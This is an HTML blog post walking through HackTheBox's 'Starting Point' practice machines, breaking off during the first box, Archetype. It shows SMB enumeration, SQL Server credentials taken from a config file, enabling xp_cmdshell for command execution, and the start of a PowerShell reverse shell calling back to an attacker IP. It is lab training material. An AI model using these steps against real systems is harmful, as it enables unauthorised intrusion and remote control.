<!DOCTYPE html>
<html lang="en" >
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Starting Point on HackTheBox (2020) - HackSpread.com</title><meta name="Description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."><meta property="og:title" content="Starting Point on HackTheBox (2020)" />
<meta property="og:description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://pasqnix.github.io/startingpoint/" /><meta property="og:image" content="https://pasqnix.github.io/startingpoint/featured-image.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-02-20T16:09:18-05:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://pasqnix.github.io/startingpoint/featured-image.jpg"/>
<meta name="twitter:title" content="Starting Point on HackTheBox (2020)"/>
<meta name="twitter:description" content="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."/>
<meta name="application-name" content="psqnix.github.io">
<meta name="apple-mobile-web-app-title" content="psqnix.github.io"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="stylesheet" href="../../../css/custom.css">
        <link rel="stylesheet" href="../../../css/style.css"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://pasqnix.github.io/startingpoint/" /><link rel="next" href="https://pasqnix.github.io/practicalbinaryanalysis_intro/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Starting Point on HackTheBox (2020)",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/pasqnix.github.io\/startingpoint\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/pasqnix.github.io\/startingpoint\/featured-image.jpg",
                            "width":  768 ,
                            "height":  1621 
                        }],"genre": "posts","keywords": "reverse engineering, ida pro, hackthebox, assembly","wordcount":  6665 ,
        "url": "https:\/\/pasqnix.github.io\/startingpoint\/","datePublished": "2020-12-14T00:00:00+00:00","dateModified": "2022-02-20T16:09:18-05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/pasqnix.github.io\/images\/mylogo.png",
                    "width":  286 ,
                    "height":  53 
                }},"author": {
                "@type": "Person",
                "name": "HackTheBox"
            },"description": "This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto" ><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop" style="border-bottom:1px solid #E1E1E1;box-shadow: 0 0 1.5rem 0 #E1E1E1;"> 
    
    <div class="header-wrapper">
        <div class="header-title" >
            <a href="/" title="HackSpread.com"><img src="/images/mylogo.png">

  
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="HackSpread.com"><img src="/images/mylogo-mobile.png">
                    
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main" >
                <div class="container" style="max-width: 100%;margin:0;padding-left:0;padding-right: 0;" ><div>
    <img
        width="200"
        height="400"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="/startingpoint/featured-image.jpg"
        data-srcset="/startingpoint/featured-image.jpg, /startingpoint/featured-image.jpg 1.5x, /startingpoint/featured-image.jpg 2x"
        data-sizes="auto"
        alt="/startingpoint/featured-image.jpg"
        title="This path is composed of 6 boxes, each box uses information (like credentials) gathered from the previous ones."
        style="width: 100%;object-fit: cover;margin: 0pt;"/></div><div class="toc" id="toc-auto" style="position:relative;background-color: #E0E0E0;">
            <table >
                <tr style="position:relative;background-color: #E0E0E0;border: 2px solid white;border-left: none;border-right: none;">
                    <td style="text-align:center;vertical-align: middle;" >Table of Contents</td>
                </tr></table>
           
        

         
         <div class="toc-content" id="toc-content-auto"></div>
    
    
            
        </div><article class="page single" style="border:0px solid black;max-width:1400px;flex-wrap: wrap;padding:2%;"><h1 class="single-title animated flipInX">Starting Point on HackTheBox (2020)</h1>
<div class="post-meta">

           
            <div class="post-meta-line" style="padding-top: 25px;;">
                <table ><tr>
                <td style="border:none"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="14 Dec 2020">14 Dec 2020</time>&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;32 minutes&nbsp;
</td><td style="border:none;text-align: right;">
                <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span></td>
            </tr></table>
            </div>


          
            

        </div>
<div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">INTRODUCTION</a></li>
    <li><a href="#9656-archtype">▸ ARCHTYPE</a>
      <ul>
        <li><a href="#9702-about">◦ About</a></li>
        <li><a href="#9702--enumeration">◦  Enumeration</a></li>
        <li><a href="#9702-foothold">◦ Foothold</a></li>
        <li><a href="#9702--privilege-escalation">◦  Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656--oopsie">▸  OOPSIE</a>
      <ul>
        <li><a href="#9702--about">◦  About</a></li>
        <li><a href="#9702--enumeration-1">◦  Enumeration</a></li>
        <li><a href="#9702-foothold-1">◦ Foothold</a></li>
        <li><a href="#9702-lateral-movement">◦ Lateral Movement</a></li>
        <li><a href="#9702--privilege-escalation-1">◦  Privilege Escalation</a>
          <ul>
            <li><a href="#x25b9--setuid">▹  <em><strong>Setuid</strong></em></a></li>
          </ul>
        </li>
        <li><a href="#9702--post-exploitation">◦  Post Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#9656-vaccine">▸ VACCINE</a>
      <ul>
        <li><a href="#9702-about-1">◦ About</a></li>
        <li><a href="#9702-enumeration">◦ Enumeration</a></li>
        <li><a href="#9702-foothold-2">◦ Foothold</a></li>
        <li><a href="#9702-privilege-escalation">◦ Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656-shield">▸ SHIELD</a>
      <ul>
        <li><a href="#9702-about-2">◦ About</a></li>
        <li><a href="#9702-enumeration-1">◦ Enumeration</a></li>
        <li><a href="#9702-foothold-3">◦ Foothold</a></li>
        <li><a href="#9702-using-netcat">◦ <em><strong>Using Netcat</strong></em></a></li>
        <li><a href="#9702-privilege-escalation-1">◦ Privilege Escalation</a></li>
        <li><a href="#9702-post-exploitation">◦ Post Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#9656-pathfinder">▸ PATHFINDER</a>
      <ul>
        <li><a href="#9702-enumeration-2">◦ Enumeration</a></li>
        <li><a href="#9702-lateral-movement-1">◦ Lateral Movement</a></li>
        <li><a href="#9702-privilege-escalation-2">◦ Privilege Escalation</a></li>
      </ul>
    </li>
    <li><a href="#9656-included-linux">▸ INCLUDED (Linux)</a>
      <ul>
        <li><a href="#9702-enumeration-3">◦ Enumeration</a></li>
        <li><a href="#9702-lfilocal-file-inclusion">◦ LFI(Local File Inclusion)</a></li>
        <li><a href="#9702-foothold-4">◦ Foothold</a></li>
        <li><a href="#x25b9-lxd">▹ LXD</a>
          <ul>
            <li><a href="#9702-introduction-to-lxd-and-lxc">◦ <em><strong>Introduction to LXD and LXC</strong></em></a></li>
            <li><a href="#9702-linux-container-lxc">◦ <em><strong>Linux Container (LXC)</strong></em></a></li>
            <li><a href="#9702-linux-daemon-lxd">◦ <em><strong>Linux daemon (LXD)</strong></em></a></li>
            <li><a href="#9702-container-technology">◦ <em><strong>Container Technology</strong></em></a></li>
          </ul>
        </li>
        <li><a href="#9702-lxd-privilege-escalation">◦ LXD Privilege Escalation</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="introduction">INTRODUCTION</h2>
<p>(<a href="sp2020.pdf" rel="">pdf</a>)</p>
<p>This path is composed of 6 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.
<br>
<br></p>
<h2 id="9656-archtype">▸ ARCHTYPE</h2>
<h3 id="9702-about">◦ About</h3>
<p>=============</p>
<p>This is a Windows box where you can learn how enumeration can lead to RCE via SQL server queries.</p>
<ul>
<li>Machine : <b>Archetype</b> </li>
<li>Ip: <b>10.10.10.27</b></li>
</ul>
<h3 id="9702--enumeration">◦  Enumeration</h3>
<p>=============</p>
<p><em><strong>nmap -sC -sV 10.10.10.27</strong></em></p>
<p>Ports 445 and 1433 are open, which are associated with file sharing
(SMB) and SQL Server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------
  **sudo nmap -sC -sV 10.10.10.27**
  
  <span class="se">\[</span>sudo<span class="se">\]</span> password <span class="k">for</span> kali:
  
  Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-04 08:58 EDT
  
  Nmap scan report <span class="k">for</span> 10.10.10.27
  
  Host is up <span class="o">(</span>0.046s latency<span class="o">)</span>.
  
  Not shown: <span class="m">996</span> closed ports
  
  PORT STATE SERVICE VERSION
  
  135/tcp open msrpc Microsoft Windows RPC
  
  139/tcp open netbios-ssn Microsoft Windows netbios-ssn
  
  **445**/tcp open microsoft-ds Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> microsoft-ds
  
  **1433/**tcp open ms-sql-s Microsoft SQL Server <span class="m">2017</span> 14.00.1000.00<span class="p">;</span> RTM
  
  <span class="p">|</span> ms-sql-ntlm-info:
  
  <span class="p">|</span> Target<span class="se">\_</span>Name: ARCHETYPE
  
  <span class="p">|</span> NetBIOS<span class="se">\_</span>Domain<span class="se">\_</span>Name: ARCHETYPE
  
  <span class="p">|</span> NetBIOS<span class="se">\_</span>Computer<span class="se">\_</span>Name: ARCHETYPE
  
  <span class="p">|</span> DNS<span class="se">\_</span>Domain<span class="se">\_</span>Name: Archetype
  
  <span class="p">|</span> DNS<span class="se">\_</span>Computer<span class="se">\_</span>Name: Archetype
  
  <span class="p">|</span><span class="se">\_</span> Product<span class="se">\_</span>Version: 10.0.17763
  
  ....
  
  Host script results:
  
  <span class="p">|</span><span class="se">\_</span>clock-skew: mean: 1h38m45s, deviation: 3h07m52s, median: 14m44s
  
  <span class="p">|</span> ms-sql-info:
  
  <span class="p">|</span> OS: Windows Server <span class="m">2019</span> Standard <span class="m">17763</span> <span class="o">(</span>Windows Server <span class="m">2019</span> Standard 6.3<span class="o">)</span>
  
  <span class="p">|</span> Computer name: Archetype
  
  <span class="p">|</span> NetBIOS computer name: ARCHETYPE<span class="se">\\</span>x00
  
  <span class="p">|</span> Workgroup: WORKGROUP<span class="se">\\</span>x00

  -------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>It is worth checking to see if anonymous access has been permitted, as
file shares often store configuration files containing passwords or
other sensitive information. We can use smbclient to list available
shares.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------
  smbclient -N -L <span class="se">\\\\\\\\</span>10.10.10.27
  
  Sharename Type Comment
  
  --------- ---- -------
  
  ADMIN<span class="se">\$</span> Disk Remote Admin
  
  **backups Disk**
  
  C<span class="se">\$</span> Disk Default share
  
  IPC<span class="se">\$</span> IPC Remote IPC
  
  SMB1 disabled -- no workgroup available

  -----------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>It seems there is a share called <strong>backups</strong>. Let&rsquo;s attempt to access it
and see what&rsquo;s inside.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------
  **smbclient -N <span class="se">\\\\\\\\</span>10.10.10.27<span class="se">\\\\</span>backups**
  
  Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
  
  smb: <span class="se">\\</span>&gt; **dir**
  
  . D <span class="m">0</span> Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
  
  .. D <span class="m">0</span> Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
  
  **prod.dtsConfig** AR <span class="m">609</span> Mon Jan <span class="m">20</span> 07:23:02 <span class="m">2020</span>
  
  <span class="m">10328063</span> blocks of size 4096. <span class="m">8251965</span> blocks available
  
  smb: <span class="se">\\</span>&gt;

  --------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>There is a dtsConfig file, which is a config file used with SSIS. Let’s
see the code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------------------------------------
  smb: <span class="se">\\</span>&gt; get prod.dtsConfig
  
  getting file <span class="se">\\</span>prod.dtsConfig of size <span class="m">609</span> as prod.dtsConfig <span class="o">(</span>3.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.5 KiloBytes/sec<span class="o">)</span>
  
  smb: <span class="se">\\</span>&gt;

  -------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Checking the file we see:</p>
<ul>
<li>
<p>The password: <strong>M3g4c0rp123</strong></p>
</li>
<li>
<p>The user ID : <strong>ARCHETYPE\sql_svc</strong></p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------------------------------------------------------
  **more prod.dtsConfig **
  
  &lt;DTSConfiguration&gt;
  
  &lt;DTSConfigurationHeading&gt;
  
  &lt;DTSConfigurationFileInfo <span class="nv">GeneratedBy</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageName</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageID</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> G
  
  <span class="nv">eneratedDate</span><span class="o">=</span><span class="s2">&#34;20.1.2019 10:01:34&#34;</span>/&gt;
  
  &lt;/DTSConfigurationHeading&gt;
  
  &lt;Configuration <span class="nv">ConfiguredType</span><span class="o">=</span><span class="s2">&#34;Property&#34;</span> <span class="nv">Path</span><span class="o">=</span><span class="s2">&#34;\\Package.Connections\[Destination\].Properties\[ConnectionString\]
</span><span class="s2">  
</span><span class="s2">  &#34;</span> <span class="nv">ValueType</span><span class="o">=</span><span class="s2">&#34;String&#34;</span>&gt;
  
  &lt;ConfiguredValue&gt;Data <span class="nv">Source</span><span class="o">=</span>.<span class="p">;</span>*Password<span class="o">=</span>***M3g4c0rp123**<span class="p">;</span>*User <span class="nv">ID</span><span class="o">=</span>***ARCHETYPE<span class="se">\\</span>sql<span class="se">\_</span>svc<span class="p">;</span>**Initial <span class="nv">Catalog</span><span class="o">=</span>Catalog<span class="p">;</span>Pro
  
  <span class="nv">vider</span><span class="o">=</span>SQLNCLI10.1<span class="p">;</span>Persist Security <span class="nv">Info</span><span class="o">=</span>True<span class="p">;</span>Auto <span class="nv">Translate</span><span class="o">=</span>False<span class="p">;</span>&lt;/ConfiguredValue&gt;
  
  &lt;/Configuration&gt;
  
  &lt;/DTSConfiguration&gt;

  -------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><h3 id="9702-foothold">◦ Foothold</h3>
<p>==========</p>
<p>We see that it contains a SQL connection string, containing credentials
for the local Windows user <strong>ARCHETYPE\sql_svc.</strong></p>
<p>Let&rsquo;s try connecting to the SQL Server using <strong>Impacket&rsquo;s</strong> mssqlclient.py
with the above credentials (pwd:<strong>M3g4c0rp123</strong> )</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------------------------------------------------------------------------------------
  python3 /usr/share/doc/python3-impacket/examples/**mssqlclient.py** ARCHETYPE/sql<span class="se">\_</span>svc@10.10.10.27 -windows-auth

  Password:
  
  <span class="se">\[\*\]</span> Encryption required, switching to TLS
  
  <span class="se">\[\*\]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
  
  <span class="se">\[\*\]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us<span class="se">\_</span>english
  
  <span class="se">\[\*\]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
  
  <span class="se">\[\*\]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
  
  <span class="se">\[\*\]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed language setting to us<span class="se">\_</span>english.
  
  <span class="se">\[\*\]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 3232<span class="o">)</span>
  
  <span class="se">\[</span>!<span class="se">\]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
  
  SQL&gt;

  ------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>We can use the <em>IS_SRVROLEMEMBER</em> function to reveal whether the
current SQL user has sysadmin (highest level) privileges on the SQL
Server. This is successful, and we do indeed have sysadmin privileges.</p>
<p>This will allow us to enable <em>xp_cmdshell</em> and gain RCE(remote code
execution) on the host. Let&rsquo;s attempt this, by inputting the commands
below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------
  **EXEC sp<span class="se">\_</span>configure <span class="s1">&#39;Show Advanced Options&#39;</span>, 1<span class="p">;</span>**
  
  **reconfigure<span class="p">;</span>**
  
  **sp<span class="se">\_</span>configure<span class="p">;</span>EXEC sp<span class="se">\_</span>configure <span class="s1">&#39;xp\_cmdshell&#39;</span>, 1**
  
  **reconfigure<span class="p">;</span>**
  
  **xp<span class="se">\_</span>cmdshell <span class="s2">&#34;whoami&#34;</span>**
  --------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The whoami command output reveals that the SQL Server is also running in
the context of the user <strong>ARCHETYPE\sql_svc</strong>. However, this account
doesn&rsquo;t seem to have administrative privileges on the host.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------------------------------------------------------------------------------------
  SQL&gt;EXEC sp<span class="se">\_</span>configure <span class="s1">&#39;Show Advanced Options&#39;</span>, 1<span class="p">;</span>
  
  reconfigure<span class="p">;</span>
  
  ....
  
  SQL&gt; EXEC sp<span class="se">\_</span>configure <span class="s1">&#39;xp\_cmdshell&#39;</span>, <span class="m">1</span>
  
  <span class="se">\[\*\]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;xp\_cmdshell&#39;</span> changed from <span class="m">1</span> to 1. Run the RECONFIGURE statement to install.
  
  SQL&gt; reconfigure<span class="p">;</span>
  
  SQL&gt; **xp<span class="se">\_</span>cmdshell <span class="s2">&#34;whoami&#34;</span>**
  
  output
  
  --------------------------------------------------------------------------------
  
  **archetype<span class="se">\\</span>sql<span class="se">\_</span>svc**
  
  NULL
  
  SQL&gt;
  --------------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s attempt to get a proper shell, and proceed to further enumerate
the system. We can save the PowerShell reverse shell below as
<strong>shell.ps1.</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------------------------------
  **<span class="se">\#</span>shell.ps1**
  
  <span class="se">\$</span><span class="nv">client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&#34;10.10.14.16&#34;</span>,443<span class="o">)</span><span class="p">;</span>
  
  <span class="se">\$</span><span class="nv">stream</span> <span class="o">=</span> <span class="se">\$</span>client.GetStream<span class="o">()</span><span class="p">;</span>
  
  <span class="se">\[</span>byte<span class="se">\[\]\]\$</span><span class="nv">bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span>
  
  <span class="k">while</span><span class="o">((</span><span class="se">\$</span><span class="nv">i</span> <span class="o">=</span> <span class="se">\$</span>stream.Read<span class="o">(</span><span class="se">\$</span>bytes, 0, <span class="se">\$</span>bytes.Length<span class="o">))</span> -ne 0<span class="o">)</span>
  
